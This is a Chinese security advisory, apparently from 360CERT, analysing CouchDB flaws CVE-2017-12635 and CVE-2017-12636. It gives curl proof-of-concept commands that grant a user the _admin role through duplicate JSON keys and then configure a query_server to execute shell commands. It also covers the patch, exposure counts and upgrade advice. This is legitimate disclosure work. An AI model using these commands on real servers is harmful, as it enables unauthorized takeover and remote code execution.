---
id: 0bc3f86b333bf27fe26fe6fdc8bda5f8
title: CouchDB漏洞(CVE–2017–12635, CVE–2017–12636)分析
tags: 
  - 安全资讯
  - 360CERT
---

# CouchDB漏洞(CVE–2017–12635, CVE–2017–12636)分析

0x00 背景
-------


Apache
CouchDB是一个开源数据库，专注于易用性和成为"完全拥抱web的数据库"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit
Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。


在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CouchDB被曝存在远程代码执行的问题。其中CVE-2017-12636的任意命令执行早在2016年即被披露，
但并未引起重视。


0x01漏洞概述
--------


CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。可以被利用于，非管理员用户赋予自身管理员身份权限。


CVE-2017-12636时由于数据库自身设计原因，管理员身份可以通过HTTP（S）方式，配置数据库。在某些配置中，可设置可执行文件的路径，在数据库运行范围内执行。结合CVE-2017-12635可实现远程代码执行。


0x02 漏洞分析
---------


CVE-2017-12635问题在于Erlang和JavaScript对JSON中重复的键处理方式具有差异性，例如{“a”:”1”,”a”:”2”},


Erlang:


1. > jiffy:decode("{\"a\":\"1\", \"a\":\"2\"}").
2. {[{\<\<"a">>,\<\<"1">>},{\<\<"a">>,\<\<"2">>}]}


JavaScript”


1. > JSON.parse("{\"a\":\"1\", \"a\": \"2\"}")
2. {a: "2"}


对于给定的键，Eralang解析器将存储两个值，但是JavaScript只存储第二个值。但是在jiffy实现的时候，getter函数只返回第一个值


1. % Within couch\_util:get\_value
2. lists:keysearch(Key, 1, List).


可以构建如下POC：


1. curl -X PUT -d '{"type":"user","name":"oops","roles":["\_admin"],"roles":[],"password":"123456"}' localhost:5984/\_users/org.couchdb.user:oops -H "Content-Type:application/json"


除了输入验证脚本之外，几乎所有关于身份验证和授权的重要逻辑都发生在CouchDB的Erlang部分，所以这样可以使当前用户赋予“\_admin”身份。


查看jiffy解析器源码，定位到patch:


![enter image description here](https://cert.360.cn/static/fileimg/CVE-2017-12635_1_1510820611.png "enter image title here")


![enter image description here](https://cert.360.cn/static/fileimg/CVE-2017-12635_2_1510820658.png "enter image title here")


可以发现patch后，加入了dedupe\_keys字段用于对重复键的标识，重写了make\_object方法，使得jiffy解析JSON的方法和JavaScript一致。


而CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB允许外部通过自身HTTP(S)
API对配置文件进行更改，一些配置选项包括操作系统级二进制文件的路径，随后会由CouchDB启动。从这里获取shell通常很简单，因为CouchDB其中一个“query\_servers“选项，可以自定义二进制文件加载路径，这个功能基本上只是一个包装execv。


![enter image description here](https://cert.360.cn/static/fileimg/CVE-2017-12635_3_1510820670.png "enter image title here")


可以构造简单的POC进行验证：


1. curl -X PUT '<http://localhost:5984/_config/query_servers/cmd>' -d '"/sbin/ifconfig >/tmp/6668"'
2. curl -X PUT 'http:// localhost:5984/vultest'
3. curl -X PUT 'http://
localhost:5984/vultest/vul' -d '{"\_id":"770895a97726d5ca6d70a22173005c7b"}'
4. curl -X POST 'http://
localhost:5984/vultest/\_temp\_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'


更改query\_servers配置，创建个临时表，调用query\_servers处理数据。这样便可以执行shell，在规定的/tmp/6668文件中，写入ifconfig信息。


这样配合之前的CVE-2017-12635权限提升漏洞，实现远程代码执行：


![enter image description here](https://cert.360.cn/static/fileimg/CVE-2017-12635_4_1510820680.png "enter image title here")


0x03 全网影响
---------


根据360CERT全网资产检索平台实时显示，
共有4943台CouchDB服务在外网开放，以美国占量为主


![enter image description here](https://cert.360.cn/static/fileimg/CVE-2017-12635_5_1510820689.png "enter image title here")


![enter image description here](https://cert.360.cn/static/fileimg/CVE-2017-12635_6_1510820696.png "enter image title here")


国内统计以广东，北京占量为主


![enter image description here](https://cert.360.cn/static/fileimg/CVE-2017-12635_7_1510820703.png "enter image title here")


0x04 修复建议
---------


1. 所有用户都应升级到CouchDB 1.7.1或 2.1.1。
2. 配置HTTP API配置参数，针对敏感配置信息加入黑名单。


0x05 时间线
--------


2016年5月 CouchDB未授权访问漏洞被披露


2017年11月15日 CVE-2017-12635，CVE-2017-12636披露


2017年11月15日 360CERT及时跟进分析


2017年11月16日 360CERT发布分析预警


0x06 参考文档
---------


<http://docs.couchdb.org/en/2.1.1/config/intro.html>


[https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E](mailto:https://lists.apache.org/thread.html/6c405bf3f8358e6314076be9f48c89a2e0ddf00539906291ebdf0c67@%3Cdev.couchdb.apache.org%3E)


<http://cb.drops.wiki/drops/papers-16030.html>


